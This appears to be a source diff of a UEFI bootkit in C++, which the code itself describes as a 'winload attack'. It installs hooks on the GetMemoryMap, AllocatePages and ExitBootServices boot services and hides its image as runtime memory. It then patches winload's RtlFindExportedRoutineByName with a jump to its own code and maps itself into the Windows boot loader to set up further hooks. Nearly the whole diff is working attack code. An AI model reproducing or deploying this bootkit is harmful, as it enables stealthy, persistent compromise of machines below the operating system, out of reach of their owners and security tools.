@@ -34,10 +34,12 @@ extern "C"
 	//
 	// EFI global variables
 	//
+	EFI_GET_MEMORY_MAP oGetMemoryMap;
 	EFI_ALLOCATE_PAGES oAllocatePages;
 	EFI_EXIT_BOOT_SERVICES oExitBootServices;
-	EFI_STATUS EFIAPI ExitBootServicesHook(EFI_HANDLE ImageHandle,UINTN MapKey);
-
+	EFI_STATUS EFIAPI ExitBootServicesHook(EFI_HANDLE ImageHandle, UINTN MapKey);
+	EFI_STATUS EFIAPI AllocatePagesHook(EFI_ALLOCATE_TYPE Type, EFI_MEMORY_TYPE MemoryType, UINTN Pages, EFI_PHYSICAL_ADDRESS *Memory);
+	EFI_STATUS EFIAPI GetMemoryMapHook(UINTN *MemoryMapSize, EFI_MEMORY_DESCRIPTOR* MemoryMap, UINTN* MapKey, UINTN* DescriptorSize, UINT32* DescriptorVersion);
 }
 
 #define Print(Text) \
@@ -66,61 +68,6 @@ inline void PressAnyKey()
 	gST->ConOut->SetAttribute(gST->ConOut, EFI_WHITE | EFI_BACKGROUND_BLACK);
 }
 
-namespace hooks
-{
-	BOOLEAN initialize(void);
-}
-
-unsigned __int64 __fastcall RtlFindExportedRoutineByName(QWORD BaseAddress, const char *ExportName)
-{
-	if (!strcmp_imp(ExportName, "NtImageInfo"))
-	{
-		pe_resolve_imports(BaseAddress, EfiBaseAddress);
-		pe_clear_headers(EfiBaseAddress);
-
-
-		__int64 (__fastcall *BlMmMapPhysicalAddressEx)(__int64 *a1, __int64 a2, unsigned __int64 a3, unsigned int a4, char a5);
-		*(QWORD*)&BlMmMapPhysicalAddressEx = GetExportByName(get_caller_base((QWORD)_ReturnAddress()), "BlMmMapPhysicalAddressEx");
-
-		
-		QWORD EfiBaseVirtualAddress = EfiBaseAddress;	
-		EFI_STATUS status = BlMmMapPhysicalAddressEx((__int64*)&EfiBaseVirtualAddress,
-							EfiBaseVirtualAddress,
-							EfiBaseSize,
-							0x24000,
-							0);
-		
-		if (!EFI_ERROR(status))
-		{
-			SwapMemory2(EfiBaseAddress, EfiBaseVirtualAddress);
-			GlobalStatusVariable = hooks::initialize();
-			SwapMemory2(EfiBaseVirtualAddress, EfiBaseAddress);
-		}
-	}
-	return GetExportByName(BaseAddress, ExportName);
-}
-
-EFI_STATUS EFIAPI AllocatePagesHook(
-	IN     EFI_ALLOCATE_TYPE            Type,
-	IN     EFI_MEMORY_TYPE              MemoryType,
-	IN     UINTN                        Pages,
-	IN OUT EFI_PHYSICAL_ADDRESS         *Memory
-	)
-{
-	QWORD return_address = (QWORD)_ReturnAddress();
-	if (*(DWORD*)(return_address) == 0x48001F0F)
-	{
-		QWORD target_routine = GetExportByName(get_caller_base(return_address), "RtlFindExportedRoutineByName");
-		if (target_routine)
-		{
-			*(QWORD*)(target_routine + 0x00) = 0x25FF;
-			*(QWORD*)(target_routine + 0x06) = (QWORD)RtlFindExportedRoutineByName;
-			gBS->AllocatePages = oAllocatePages;
-		}
-	}
-	return oAllocatePages(Type, MemoryType, Pages, Memory);
-}
-
 extern "C" EFI_STATUS EFIAPI EfiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
 {
 	gRT = SystemTable->RuntimeServices;
@@ -129,7 +76,7 @@ extern "C" EFI_STATUS EFIAPI EfiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TA
 
 
 	EFI_LOADED_IMAGE_PROTOCOL *current_image;
-
+	
 
 	//
 	// Get current image information
@@ -140,50 +87,35 @@ extern "C" EFI_STATUS EFIAPI EfiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TA
 		return 0;
 	}
 
-
-	UINTN page_count = EFI_SIZE_TO_PAGES (current_image->ImageSize);
-	VOID  *rwx       = 0;
-
+	//
+	// save image information
+	//
+	EfiBaseAddress = (QWORD)current_image->ImageBase;
+	EfiBaseSize    = current_image->ImageSize;
 
 	//
-	// allocate space for SwapMemory
+	// prevent gBS->StartImage for terminating us
 	//
-	if (EFI_ERROR(gBS->AllocatePages(AllocateAnyPages, EfiRuntimeServicesCode, page_count, (EFI_PHYSICAL_ADDRESS*)&rwx)))
-	{
-		Print(FILENAME L" Failed to start " SERVICE_NAME L" service.");
-		return 0;
-	}
-
+	*(QWORD *)((QWORD)current_image - 0x18) = EFI_IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER;
+	
 
 	//
-	// swap our context to new memory region
+	// GetMemoryMapHook: Reserve RAM space
 	//
-	SwapMemory( (QWORD)current_image->ImageBase, (QWORD)current_image->ImageSize, (QWORD)rwx );
-
-
-	//
-	// clear old image from memory
-	//
-	for (QWORD i = current_image->ImageSize; i--;)
-	{
-		((unsigned char*)current_image->ImageBase)[i] = 0;
-	}
-
+	oGetMemoryMap = gBS->GetMemoryMap;
+	gBS->GetMemoryMap = GetMemoryMapHook;
 
 	//
-	// save our new EFI address information
+	// ExitBootServices: Output EFI status
 	//
-	EfiBaseAddress = (QWORD)rwx;
-	EfiBaseSize    = (QWORD)current_image->ImageSize;
-
+	oExitBootServices = gBS->ExitBootServices;
+	gBS->ExitBootServices = ExitBootServicesHook;
+	
 	//
-	// install EFI hooks for winload attack
+	// AllocatePages: winload/ntoskrnl.exe hooks
 	//
 	oAllocatePages = gBS->AllocatePages;
 	gBS->AllocatePages = AllocatePagesHook;
-
-	oExitBootServices = gBS->ExitBootServices;
-	gBS->ExitBootServices = ExitBootServicesHook;
 
 	gST->ConOut->ClearScreen(gST->ConOut);
 	gST->ConOut->SetAttribute(gST->ConOut, EFI_WHITE | EFI_BACKGROUND_BLACK);
@@ -194,7 +126,7 @@ extern "C" EFI_STATUS EFIAPI EfiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TA
 	return EFI_SUCCESS;
 }
 
-extern "C" EFI_STATUS EFIAPI ExitBootServicesHook(EFI_HANDLE ImageHandle,UINTN MapKey)
+extern "C" EFI_STATUS EFIAPI ExitBootServicesHook(EFI_HANDLE ImageHandle, UINTN MapKey)
 {
 	gBS->ExitBootServices = oExitBootServices;
 
@@ -214,5 +146,75 @@ extern "C" EFI_STATUS EFIAPI ExitBootServicesHook(EFI_HANDLE ImageHandle,UINTN M
 	PressAnyKey();
 
 	return gBS->ExitBootServices(ImageHandle, MapKey);
+}
+
+namespace hooks
+{
+	BOOLEAN initialize(void);
+}
+
+unsigned __int64 __fastcall RtlFindExportedRoutineByName(QWORD BaseAddress, const char *ExportName)
+{
+	if (!strcmp_imp(ExportName, "NtImageInfo"))
+	{
+		pe_resolve_imports(BaseAddress, EfiBaseAddress);
+		pe_clear_headers(EfiBaseAddress);
+
+		__int64 (__fastcall *BlMmMapPhysicalAddressEx)(__int64 *a1, __int64 a2, unsigned __int64 a3, unsigned int a4, char a5);
+		*(QWORD*)&BlMmMapPhysicalAddressEx = GetExportByName(get_caller_base((QWORD)_ReturnAddress()), "BlMmMapPhysicalAddressEx");
+		
+		QWORD EfiBaseVirtualAddress = EfiBaseAddress;	
+		EFI_STATUS status = BlMmMapPhysicalAddressEx((__int64*)&EfiBaseVirtualAddress,
+							EfiBaseVirtualAddress,
+							EfiBaseSize,
+							/*0x24000*/ 0x424000 /*0x1044008*/,
+							0);
+		
+		if (!EFI_ERROR(status))
+		{
+			SwapMemory2(EfiBaseAddress, EfiBaseVirtualAddress);
+			GlobalStatusVariable = hooks::initialize();
+			SwapMemory2(EfiBaseVirtualAddress, EfiBaseAddress);
+		}
+	}
+	return GetExportByName(BaseAddress, ExportName);
+}
+
+extern "C" EFI_STATUS EFIAPI AllocatePagesHook(EFI_ALLOCATE_TYPE Type, EFI_MEMORY_TYPE MemoryType, UINTN Pages, EFI_PHYSICAL_ADDRESS *Memory)
+{
+	QWORD return_address = (QWORD)_ReturnAddress();
+	if (*(DWORD*)(return_address) == 0x48001F0F)
+	{
+		QWORD target_routine = GetExportByName(get_caller_base(return_address), "RtlFindExportedRoutineByName");
+		if (target_routine)
+		{
+			*(QWORD*)(target_routine + 0x00) = 0x25FF;
+			*(QWORD*)(target_routine + 0x06) = (QWORD)RtlFindExportedRoutineByName;
+			gBS->AllocatePages = oAllocatePages;
+		}
+	}
+	return oAllocatePages(Type, MemoryType, Pages, Memory);
+}
+
+extern "C" EFI_STATUS EFIAPI GetMemoryMapHook(UINTN *MemoryMapSize, EFI_MEMORY_DESCRIPTOR* MemoryMap, UINTN* MapKey, UINTN* DescriptorSize, UINT32* DescriptorVersion)
+{
+	EFI_STATUS status = oGetMemoryMap(MemoryMapSize, MemoryMap, MapKey, DescriptorSize, DescriptorVersion);
+	if (!EFI_ERROR(status))
+	{
+		VOID *map = MemoryMap;
+		UINTN map_size = *MemoryMapSize;
+		UINTN descriptor_size = *DescriptorSize;
+		UINTN descriptor_count = map_size / descriptor_size;
+
+		for (UINT32 i = 0; i < descriptor_count; i++)
+		{
+			EFI_MEMORY_DESCRIPTOR *entry = (EFI_MEMORY_DESCRIPTOR*)((char *)map + (i*descriptor_size));
+			if (EfiBaseAddress >= entry->PhysicalStart && EfiBaseAddress <= (entry->PhysicalStart + EFI_PAGES_TO_SIZE(entry->NumberOfPages)))
+			{
+				entry->Type = EfiRuntimeServicesCode;
+			}
+		}
+	}
+	return status;
 }
 
